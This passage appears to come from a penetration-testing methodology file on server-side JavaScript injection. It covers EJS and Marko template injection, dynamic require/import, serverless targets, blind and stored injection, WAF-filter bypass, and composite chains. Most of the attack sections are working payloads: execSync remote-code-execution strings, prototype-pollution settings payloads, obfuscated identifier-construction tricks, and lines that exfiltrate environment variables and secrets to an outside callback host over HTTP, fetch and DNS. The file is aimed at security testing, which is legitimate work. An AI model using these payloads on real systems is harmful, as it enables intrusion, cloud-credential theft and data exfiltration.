**Primitive.** EJS `render(template, data)` and `compile(template)` compile to a Function via `new Function(...)`. `<%= expr %>` is HTML-escaped output; `<%- expr %>` is unescaped; `<% code %>` is unbuffered code. Each embeds attacker-controlled bytes in the function body.

**Preconditions.**
1. EJS `compile(template)` or `render(template)` with `template` attacker-controlled.
2. Target renders.

**Attack recipe (unescaped-output primitive):**
```ejs
<%- (({}).constructor.constructor('return this')()).process.mainModule.require('child_process').execSync('id').toString() %>
```

**Alternate recipe (unbuffered-code with return via output):**
```ejs
<% const F = ({}).constructor.constructor; const r = F('return this')().process.mainModule.require('child_process').execSync('id').toString(); %>
<p><%- r %></p>
```

**Alternate recipe (CVE-2022-29078 class — settings pollution):**
```javascript
// Pollute via proto-pollution reaching EJS options
Object.prototype.outputFunctionName = '_tmp; return process.mainModule.require("child_process").execSync("id").toString(); //';
// EJS compile embeds the setting into the generated Function body
// (requires attacker-controlled prototype — route via prototype_pollution.md)
```

**Confirmation signals.**
1. **Reflected exec output in rendered page.**
2. **`EJSError` with the compiled-function source** on compile failure.
3. **`<%= 7*7 %>` → `49`** confirms EJS compile+execute.
4. **Prototype-pollution variant** confirmed by changing `Object.prototype.escapeFunction` and observing escaping behavior change.

**Impact.** Full RCE. Historical CVE-2022-29078 class demonstrates settings-pollution reach; current EJS requires attacker-controlled template source directly.

### Marko

**Primitive.** Marko compiles with `@marko/compiler`; `${expression}` is JS context in Marko templates. `<% code %>` is unbuffered code. Both embed in the compiled function body.

**Preconditions.**
1. Marko compile step runs on attacker-controlled template source.
2. Target renders.

**Attack recipe:**
```marko
${(({}).constructor.constructor('return this')()).process.mainModule.require('child_process').execSync('id').toString()}
```

**Confirmation signals.**
1. **Reflected exec output.**
2. **Compile-time error with the attacker JS visible.**
3. **`${7*7}` → `49`** confirms the compile.

**Impact.** Full RCE. Marko's compile model is ahead-of-time by default; the vulnerable deployment is one that compiles templates at request time or recompiles on template changes.

### Class generalization — compile-time vs render-time primitives

If the engine compiles templates at request time (Pug default, EJS default, Handlebars `handlebars.compile(src)` at request time), the primitive fires at compile time — attacker reaches Function via the compiler. If templates are precompiled and only *data* is attacker-controlled, the primitive is scope-bound; find a helper that evaluates `.constructor` or route to `ssti.md` for the data-channel SSTI classes.

Engine-agnostic reach check:
1. **Compile-time?** Any `.compile(userBytes)` call. Immediately a Function sink.
2. **Render-time with helpers?** Helpers that resolve properties on bare values reach `.constructor`; route to the helper audit.
3. **Prototype-polluted settings?** EJS and other engines read config from a shared object; proto-pollution reaches the Function construction.

## Dynamic require and import()

### require(userPath) primitive

Preconditions:
- `require` reachable in the eval context (always true for Node CommonJS).
- Path argument attacker-controlled (even partially — a prefix constant with user suffix reaches modules under the suffix path).
- Node's module resolution reaches the attacker-controlled path (`./`, absolute, or via `NODE_PATH`/`node_modules`).

Attack recipe (via SSJI primitive):
```javascript
// Guest-side
require('/tmp/attacker.js');          // if the attacker previously wrote to /tmp
require('../../../../tmp/attacker');  // path traversal in resolution
require(process.env.HOME + '/.ssh/known_hosts');   // read-via-require is impossible, but a .js file in cwd runs on require
```

Confirmation: `require.cache` lists the loaded module path after the call. The module's top-level body runs at `require` time — a one-shot RCE primitive.

Impact: chain `insecure_file_uploads.md`-landed `.js` → `require('/uploads/evil.js')` for upload-to-RCE. Chain `prototype_pollution_novel_deep.md § NPM CLI End-to-End Chain` for the documented pollution-reaches-require path.

### import() dynamic primitive

Preconditions:
- ESM context (`.mjs`, `type: "module"` in package.json, or a Node file explicitly running ESM).
- Dynamic `import()` reachable (always true in ESM).

Attack recipe: identical shape to `require`, but returns a Promise:
```javascript
await import(userSpecifier);
```
Confirmation: the imported module's top-level body ran. CVE-2022-24790-class issues (Node ESM path handling across versions) occasionally expose additional primitives — see `ssji_novel_deep.md` for current examples.

### Class generalization

Any user-controlled module specifier reaching `require` or `import()` is a code-execution primitive if the attacker can land a `.js`/`.mjs`/`.cjs` file at a resolvable path. The attack is not "require the right path" — it is "land a file + reach require." Route the landing-primitive hunt to `insecure_file_uploads.md`, `path_traversal_lfi_rfi.md`, and `prototype_pollution_novel_deep.md`.

## Serverless JS Exploitation

### AWS Lambda custom runtime

Preconditions: a Lambda function with `handler` reading an event field and passing to `eval` / `Function` / `vm.runInContext`.

Attack recipe:
```javascript
// Event payload
{ "code": "process.env" }

// Handler
exports.handler = async (event) => eval(event.code);   // reflected eval result
```

Confirmation: `process.env.AWS_LAMBDA_FUNCTION_NAME`, `process.env.AWS_REGION`, `process.env.AWS_ACCESS_KEY_ID`, `process.env.AWS_SECRET_ACCESS_KEY`, `process.env.AWS_SESSION_TOKEN` all return values — the Lambda execution role's temporary credentials. The finding is "cloud identity compromised," not "env var dumped." Route credential-use to `cloud/aws_metadata.md`.

### Cloudflare Workers

Preconditions: a Worker that compiles user-supplied `importScripts`-shaped text at request time, or evaluates a user-supplied `new Response(script, { contentType: 'application/javascript' })` consumed by a `(await import(responseBodyURL))` path.

Attack recipe:
```javascript
// Worker code (vulnerable)
const userScript = request.headers.get('x-user-script');
const module = await import(`data:application/javascript,${encodeURIComponent(userScript)}`);
module.default();
```

Confirmation: `caches` and `KV_BINDING.list()` and `env.MY_SECRET` all reachable in guest code — Worker-scoped reach. No `process`, no `require`, no OS reach. The finding is Worker-script RCE with Worker secrets, not host RCE.

### Deno Deploy / Deno isolate

Preconditions: Deno process run with `--allow-run` or `--allow-net` or `--allow-read`. SSJI inherits every granted permission.

Attack recipe (with `--allow-run`):
```javascript
new Deno.Command('id').output();   // runs host OS command with Deno process's permissions
```

Confirmation: output includes the host's `id` output. Without `--allow-run`, throws `PermissionDenied`.

### Class generalization

Serverless SSJI's blast radius is the function's execution-identity scope. The finding ladder:
1. Reach eval primitive.
2. `process.env` dump (Lambda) or `env` binding read (Workers) or `Deno.env.toObject()` (Deno).
3. Credential/secret inventory.
4. Chain to cloud API with those credentials — route to `cloud/aws_metadata.md`, `cloud/gcp_metadata.md`, `cloud/azure_metadata.md` for provider specifics.

## Blind SSJI Methodology

When no reflected signal exists:

1. **Time-based primitive.** `require('child_process').execSync('sleep 5')` (direct exec path) → `await new Promise(r => setTimeout(r, 5000))` (when exec is blocked) → `while(Date.now() - t < 5000)` busy-wait (when both are blocked). Delta against a baseline reveals eval.
2. **OAST exfil.** `require('http').get('http://xyz.oast.fun/' + encodeURIComponent(JSON.stringify(process.env)))` — the callback body carries exfil. For a sandbox that blocks `http` module but allows `fetch`: `fetch('https://xyz.oast.fun/' + Buffer.from(process.env.SECRET).toString('base64'))`.
3. **DNS exfil.** `require('dns').resolve4('exfil-' + Buffer.from(process.env.SECRET).toString('hex') + '.xyz.oast.fun', ...)` — label-length-bounded (<63 chars per label) exfil channel. Works where only DNS egress is permitted.
4. **In-band side-channel.** The response status code or header value differentiates `if (process.env.KEY.charCodeAt(0) === 97) throw 1` — a thrown error produces one status, success another. Enumerate secrets a byte at a time.
5. **State persistence.** Write to a known filesystem path via `require('fs').writeFileSync('/tmp/x', JSON.stringify(process.env))`, then read via a separate request if any read path exists.
6. **DNS over polling.** For a cron-shaped execution that doesn't accept input but polls a config file, poison the config to include the eval payload — fires on next poll.

## Second-Order and Stored SSJI

Primitive: attacker input stored and later evaluated by a different request/user.

Preconditions:
- Input stored (DB, filesystem, cache).
- Downstream path (same user later, admin, batch job) reads the stored input and passes it to `Function`/`eval`/`vm`.

Pattern: a "my settings → custom formula" field persisted to a user profile; on next login the server runs the formula with the current session context.

Confirmation: in a scan, submit a formula whose evaluation side-effects an observable (`require('child_process').execSync('curl xyz.oast.fun/stored')`). Observe the callback timing relative to the storing request vs the triggering request — a delayed callback (minutes to hours after storage) is stored SSJI.

Impact: user→user escalation; admin impersonation if the formula runs with admin context on a cron. Route privilege-elevation framing to `broken_function_level_authorization.md` for the "runs with admin role" classifier.

## WAF / Identifier-Filter Bypass as a Technique Class

WAFs and server-side sanitizers for SSJI typically filter identifier strings — `eval`, `Function`, `require`, `process`, `child_process`. The class defeats this by reaching every identifier without textually writing it.

### String-construction primitive

```javascript
// Reach `process` without writing it
const p = 'proc' + 'ess';
globalThis[p]            // → process

// Reach `require` without writing it
const r = ['req', 'uire'].join('');
globalThis[r]('fs')

// Reach `child_process` without writing the string
const cp = String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115);
```

### Member-access primitive

`.constructor.constructor` reaches Function without writing `Function`. `.__proto__.constructor` works where `.constructor` is intercepted but `__proto__` is not. Where both are filtered, `Reflect.getPrototypeOf({}).constructor` is a third path.

### Prototype-chain primitive

Any built-in's prototype has a `.constructor` reaching its class:
```javascript
[].constructor                    // Array
[].constructor.__proto__          // Function (Array itself inherits from Function via class)
[]['constructor']['__proto__']    // same, bracket-access form
Error.prototype.constructor       // Error, which inherits .constructor to Function
```

### Encoding-based bypass

```javascript
// Hex escape in string literal
"\x72\x65\x71\x75\x69\x72\x65"            // "require"
"require"
// Octal (strict mode rejects \0 but \u is universal)

// String.raw template
String.raw`require`                        // "require" bytes identically but visible to filter

// JSFuck / brainfuck-like full-ASCII encodings — reach any identifier using only [](!+)
```

### AST-level primitive

A sanitizer that uses `acorn.parse` to walk the AST and check Identifier nodes still fails if the attack uses `MemberExpression` with computed-property-access reaching the sink via a string that is itself constructed. The AST walker that rejects `process` as an identifier passes `globalThis['proc' + 'ess']` because no identifier node reads `process`.

Mitigation shape that actually works: a bounded expression grammar that disallows member access on identifier operands, string concatenation feeding member access, and reflection APIs. "Deny-list of identifier names" is defeated by any of the above.

## Composite Chains

### Pollution → eval
1. **Precondition:** a `__proto__`-reaching merge in request handling.
2. **Reach:** pollute `Object.prototype.code` to a Function-body string.
3. **Trigger:** a downstream `template.compile(opts)` reads `opts.code` from the inherited chain, compiles to Function, invokes.
4. **Payload:** `{"__proto__": {"code": "return process.mainModule.require('child_process').execSync('id')"}}`.
Route: `prototype_pollution.md` (precondition) → this file (compile) → `rce.md` (post-exploitation).

### Upload → require
1. **Precondition:** an upload path with no server-side extension filter, writing to a plugin-scan location.
2. **Reach:** upload `evil.js` to `/var/app/plugins/`.
3. **Trigger:** scheduled plugin scan runs `require('/var/app/plugins/evil.js')`.
4. **Payload:** `evil.js` has `require('child_process').execSync('id > /tmp/pwned'); module.exports = {}`.
Route: `insecure_file_uploads.md` (upload) → this file (dynamic require) → `rce.md`.

### SSRF → internal /execute endpoint
1. **Precondition:** an internal "run script" admin endpoint, CSRF-protected but reachable from an SSRF-reachable network segment.
2. **Reach:** SSRF to `http://internal/execute?code=...`.
3. **Trigger:** the endpoint eval's the `code` parameter.
Route: `ssrf.md` (reach) → this file (eval) → `rce.md`.

### Deserialization → eval
1. **Precondition:** a Java/Python/Node deserialization sink.
2. **Reach:** a crafted object whose reconstruction reaches `Function.prototype.apply` with attacker arguments.
Route: `insecure_deserialization.md § Node.js Gadget Classes` (precondition) → this file (eval).

## Advanced Testing Methodology

1. **Fingerprint runtime first.** `process.version` vs `Deno.version` vs `typeof caches === 'object'` (Workers) vs `typeof globalThis.v8 !== 'undefined'` vs neither (QuickJS) determines the primitive set.
2. **Enumerate the sandbox library.** `({}).constructor.name` returns `Object` in Node; `vm2`-labeled context has transformed prototypes; isolated-vm has a separate Isolate with its own realm; QuickJS has distinct type-tag behavior.
3. **Run the primitive expression ladder in reverse order of safety.** Start with `7*7`, confirm eval; test `process.version` for Node confirmation; try the `.constructor.constructor` chain; attempt `child_process` reach; attempt `fs` reach; attempt `fetch` reach.
4. **Match CVE to version.** Before firing a 2026 vm2 primitive, check the sandbox library version. The novel sibling's canonical table maps CVE → version — a wrong version is a wasted probe.
5. **Observe side-channel on every attempt.** Even failed eval attempts often throw error messages with stack traces that reveal the library name and version — more useful than a 500 "unknown error."
6. **Confirm via OAST before claiming exec.** A reflected `7*7 → 49` with no OAST confirmation is "evaluator identified." A reflected `require('child_process').execSync('nslookup $(hostname).xyz.oast.fun')` returning the hostname-labeled DNS hit on OAST is "host RCE confirmed."

## Chaining — Advanced Composite Constructions

Any of the following produces a usable finding when the direct SSJI primitive is bounded:

- **node:vm with sandbox-escape-blocked but `console.log` free.** The sandbox strips `.constructor` and `.__proto__` but a leaked `console.log` is a side-channel. The channel is slow (one byte per log call) but exfils local-scope data.
- **isolated-vm with no exposed bindings but a `Reference`-return path.** The host exposes `.setSync` and `.getSync` with no bindings on the isolate. The guest can mutate the host's local variable but not exec. Chain to a host-side read that uses the mutated variable in a `Function` sink — rare, but a documented primitive class.
- **QuickJS with a registered `require` binding.** The host registered `require(path)` as a QuickJS binding to let scripts load libraries. Any user-controlled path reaches arbitrary require.
- **Serverless with `--allow-net` but no `--allow-run`.** Guest cannot exec but can `fetch` any URL. Chain to internal services via network reach — route to `ssrf.md` for the specific internal-service matrix.

## Advanced Detection

- **Stack-trace fingerprinting.** `new Error().stack` from guest code reveals vm2 Transformer wrapping (lines reference `vm2/lib/`), isolated-vm (`isolated-vm/isolated-vm.js`), node:vm (`node:vm`), or no sandbox at all (direct host paths). The library name is a scan output on its own.
- **Realm-identity probing.** `({}).constructor === Object` is always true; `({}).constructor === globalThis.Object` is true in the same realm, false across isolates. isolated-vm has `({}).constructor !== top-of-host-Object`.
- **`setImmediate` reach.** Node-specific; distinguishes Node from Deno (Deno aliases `setImmediate` to a shim) and Workers (no `setImmediate`).
- **`process.binding('spawn_sync')` deprecation.** Deprecated in Node 12, removed in Node 24. A payload that reaches `process.binding` and succeeds confirms a Node 20-and-below target.
- **`Buffer.from` + `BigInt` reach.** `BigInt(1)` works in Node 10.4+; `Buffer.from` is a Node primitive missing in Workers. Both narrow the runtime.

## Deep Second-Order Attack-Graph Model

Nodes = (eval-primitive-reach : language runtime : library sandbox : library version). Edges = capability-transfers.
- `vm2-escape → host-realm Function`: requires vm2 3.11.5 or earlier, requires any Transformer-missed path.
- `isolated-vm-escape → host-realm Function`: requires isolated-vm ≤7.0.0, requires `ExternalCopy` with a type-confusable binding.
- `node:vm reach → host-realm Function`: no version precondition — always available on `node:vm` with any context.
- `template-compile → Function`: requires attacker-controlled template source.

The graph compresses "SSJI in library X at version Y" to "the escape primitive this library ships at that version." The novel sibling populates the CVE edges; this file owns the structural model.

## Advanced Validation

- **A sandbox-escape claim requires a documented escape path on the pinned version.** A 2023 vm2 primitive against vm2 3.11.5 is a false positive — the pre-fix mechanism was patched. Match CVE to version from `ssji_novel_deep.md § Canonical 2024–2026 CVE Version/Fix Table`.
- **Reflected `7*7 → 49` is "evaluator present," not "RCE."** The next required step is a runtime-fingerprint primitive (`process.version` reflected) and a host-reach primitive (`require('os').hostname()` or `require('child_process').execSync('id')`).
- **A fingerprinted QuickJS target with no host bindings has no exec path.** The finding is bounded to in-interpreter work plus DoS; writing it up as "host RCE" is wrong.
- **A finding on an admin-only endpoint is still a finding.** Note the privilege gate explicitly. "Admin can execute arbitrary code" is a persistence and lateral-movement primitive, not a bug-not-filed.

## False Positives

- A sink that reflects `"7*7"` as a literal, not `49` — the sink is a template or printf, not an evaluator.
- A JSON serializer that stringifies `{code: "7*7"}` back to `"{\"code\":\"7*7\"}"` — serializer, not evaluator.
- A `mathjs` or `expr-eval` fingerprinted-and-pinned engine with chained member access blocked at the AST level — if the parser rejects `.constructor` as a disallowed property, the primitive fails; test the specific pinned version.
- A sandboxed `isolated-vm` instance with no bindings and no `ExternalCopy` reach — the JS-level primitives fail; the finding is contained unless a C++-side escape class applies.
- A "code eval" field that routes to a subprocess (not an in-process eval) — the primitive is `child_process` via a different sink; route to `argument_injection.md` or `rce.md`.
- A browser-side `eval` on an SSR page where the SSR server renders HTML but does not execute embedded `<script>` — the eval runs client-side; the finding is XSS (route to `xss.md`), not SSJI.

## Summary

The SSJI advanced tier is the full established sandbox-escape lineage: node:vm's `.constructor.constructor` primitive (works on any leaked ref including the sandbox global itself), vm2's Transformer-bypass primitive classes (Promise `.then`, Error.cause, Buffer-pool, nesting, species, WebAssembly, native-loader-builtin), isolated-vm's native-binding type-confusion class, QuickJS/Deno/Workers' host-binding-boundary surface, "safe" expression engines' member-access escape class, template-engine JS compile contexts (Handlebars/Pug/EJS/Marko) as compile-time Function sinks, dynamic require/import() as the land-and-reach pair, serverless as cloud-identity theft, blind methodology via OAST/DNS/time/side-channel, second-order via storage, and WAF-identifier-filter bypass via string construction/member access/encoding/AST-level computed-access. Every CVE instance in `ssji_novel_deep.md` reduces to one of these primitive classes; this file owns the structural catalogue, the novel sibling owns the versioned instances.
